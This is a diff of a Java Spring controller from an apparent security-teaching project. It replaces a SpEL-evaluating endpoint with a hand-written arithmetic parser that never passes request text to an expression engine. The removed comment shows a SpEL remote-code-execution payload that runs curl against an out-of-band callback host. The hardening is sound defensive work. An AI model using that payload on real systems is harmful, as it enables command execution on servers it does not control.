@@ -1,22 +1,13 @@
 package org.joychou.controller;
 
-import org.springframework.expression.ConstructorResolver;
-import org.springframework.expression.EvaluationException;
 import org.springframework.expression.ExpressionParser;
-import org.springframework.expression.MethodResolver;
-import org.springframework.expression.PropertyAccessor;
-import org.springframework.expression.TypeLocator;
-import org.springframework.expression.spel.SpelEvaluationException;
-import org.springframework.expression.spel.SpelMessage;
 import org.springframework.expression.spel.standard.SpelExpressionParser;
-import org.springframework.expression.spel.support.StandardEvaluationContext;
 import org.joychou.util.WebUtils;
 import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import java.util.Collections;
-import java.util.regex.Pattern;
+import java.math.BigDecimal;
+import java.math.MathContext;
 
 
 /**
@@ -28,39 +19,203 @@ import java.util.regex.Pattern;
 public class SpEL {
 
     private static final int MAX_EXPRESSION_LENGTH = 100;
-    private static final Pattern SAFE_EXPRESSION = Pattern.compile(
-            "^[0-9+\\-*/%()<>=!?:. ]*(?:'[a-zA-Z0-9 ]*'[0-9+\\-*/%()<>=!?:. ]*)*$");
+    private static final int MAX_DEPTH = 20;
 
     /**
-     * SpEL to RCE
-     * http://localhost:8080/spel/vul/?expression=xxx.
-     * xxx is urlencode(exp)
-     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+     * Arithmetic expression endpoint.
+     * Request text is never handed to an expression engine; it is evaluated by a small
+     * hand-written recursive-descent evaluator that only understands numbers, + - * / %,
+     * parentheses and a single optional comparison (&lt; &gt; &lt;= &gt;= == !=).
+     * http://localhost:8080/spel/vuln/?expression=1%2B2
      */
     @GetMapping("/spel/vuln")
     public String rce(String expression) {
-        ExpressionParser parser = new SpelExpressionParser();
-        // Locked-down evaluation context (SimpleEvaluationContext is not available in the Spring 4.3.x
-        // managed by this Boot version): no type references (T(..)), no constructors, no method
-        // invocation, no property access and no bean references. Literals and operators still work.
-        StandardEvaluationContext context = new StandardEvaluationContext();
-        context.setTypeLocator(new TypeLocator() {
-            @Override
-            public Class<?> findType(String typeName) throws EvaluationException {
-                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
-            }
-        });
-        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
-        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
-        context.setPropertyAccessors(Collections.<PropertyAccessor>emptyList());
-        context.setBeanResolver(null);
-        // Expression allowlist: only numbers, operators and single-quoted literals; identifiers (T(..), new,
-        // bean names, method names) can never appear outside a quoted literal.
-        if (expression == null || expression.length() > MAX_EXPRESSION_LENGTH
-                || !SAFE_EXPRESSION.matcher(expression).matches()) {
+        if (expression == null || expression.length() > MAX_EXPRESSION_LENGTH) {
             return "Bad boy. I got u.";
         }
-        return WebUtils.htmlEncode(String.valueOf(parser.parseExpression(expression).getValue(context)));
+        try {
+            return WebUtils.htmlEncode(new ArithmeticEvaluator(expression).evaluate());
+        } catch (IllegalArgumentException | ArithmeticException e) {
+            return "Bad boy. I got u.";
+        }
+    }
+
+    /**
+     * Minimal evaluator. Grammar:
+     * <pre>
+     * expr    := add [ (&lt; | &gt; | &lt;= | &gt;= | == | !=) add ]
+     * add     := mul { (+ | -) mul }
+     * mul     := unary { (* | / | %) unary }
+     * unary   := (+ | -) unary | primary
+     * primary := number | ( add )
+     * </pre>
+     */
+    private static final class ArithmeticEvaluator {
+        private final String src;
+        private int pos = 0;
+        private int depth = 0;
+
+        ArithmeticEvaluator(String src) {
+            this.src = src;
+        }
+
+        String evaluate() {
+            BigDecimal left = add();
+            skipSpaces();
+            String op = null;
+            if (pos < src.length()) {
+                char c = src.charAt(pos);
+                char n = pos + 1 < src.length() ? src.charAt(pos + 1) : '\0';
+                if (c == '<' || c == '>') {
+                    op = n == '=' ? String.valueOf(c) + "=" : String.valueOf(c);
+                } else if ((c == '=' || c == '!') && n == '=') {
+                    op = String.valueOf(c) + "=";
+                }
+            }
+            if (op == null) {
+                expectEnd();
+                return left.stripTrailingZeros().toPlainString();
+            }
+            pos += op.length();
+            BigDecimal right = add();
+            expectEnd();
+            int cmp = left.compareTo(right);
+            boolean result;
+            switch (op) {
+                case "<":  result = cmp < 0;  break;
+                case ">":  result = cmp > 0;  break;
+                case "<=": result = cmp <= 0; break;
+                case ">=": result = cmp >= 0; break;
+                case "==": result = cmp == 0; break;
+                default:   result = cmp != 0; break;
+            }
+            return result ? "true" : "false";
+        }
+
+        private void expectEnd() {
+            skipSpaces();
+            if (pos != src.length()) {
+                throw new IllegalArgumentException("unexpected input");
+            }
+        }
+
+        private void skipSpaces() {
+            while (pos < src.length() && src.charAt(pos) == ' ') {
+                pos++;
+            }
+        }
+
+        private BigDecimal add() {
+            BigDecimal value = mul();
+            while (true) {
+                skipSpaces();
+                if (pos >= src.length()) {
+                    return value;
+                }
+                char c = src.charAt(pos);
+                if (c == '+') {
+                    pos++;
+                    value = value.add(mul());
+                } else if (c == '-') {
+                    pos++;
+                    value = value.subtract(mul());
+                } else {
+                    return value;
+                }
+            }
+        }
+
+        private BigDecimal mul() {
+            BigDecimal value = unary();
+            while (true) {
+                skipSpaces();
+                if (pos >= src.length()) {
+                    return value;
+                }
+                char c = src.charAt(pos);
+                if (c == '*') {
+                    pos++;
+                    value = value.multiply(unary());
+                } else if (c == '/') {
+                    pos++;
+                    value = value.divide(unary(), MathContext.DECIMAL64);
+                } else if (c == '%') {
+                    pos++;
+                    value = value.remainder(unary());
+                } else {
+                    return value;
+                }
+            }
+        }
+
+        private BigDecimal unary() {
+            skipSpaces();
+            if (pos < src.length()) {
+                char c = src.charAt(pos);
+                if (c == '-' || c == '+') {
+                    pos++;
+                    enter();
+                    try {
+                        BigDecimal v = unary();
+                        return c == '-' ? v.negate() : v;
+                    } finally {
+                        depth--;
+                    }
+                }
+            }
+            return primary();
+        }
+
+        private BigDecimal primary() {
+            skipSpaces();
+            if (pos >= src.length()) {
+                throw new IllegalArgumentException("unexpected end");
+            }
+            char c = src.charAt(pos);
+            if (c == '(') {
+                pos++;
+                enter();
+                try {
+                    BigDecimal v = add();
+                    skipSpaces();
+                    if (pos >= src.length() || src.charAt(pos) != ')') {
+                        throw new IllegalArgumentException("missing )");
+                    }
+                    pos++;
+                    return v;
+                } finally {
+                    depth--;
+                }
+            }
+            return number();
+        }
+
+        private BigDecimal number() {
+            int start = pos;
+            boolean dot = false;
+            while (pos < src.length()) {
+                char c = src.charAt(pos);
+                if (c >= '0' && c <= '9') {
+                    pos++;
+                } else if (c == '.' && !dot) {
+                    dot = true;
+                    pos++;
+                } else {
+                    break;
+                }
+            }
+            String text = src.substring(start, pos);
+            if (text.isEmpty() || ".".equals(text)) {
+                throw new IllegalArgumentException("number expected");
+            }
+            return new BigDecimal(text);
+        }
+
+        private void enter() {
+            if (++depth > MAX_DEPTH) {
+                throw new IllegalArgumentException("too deep");
+            }
+        }
     }
 
     public static void main(String[] args) {
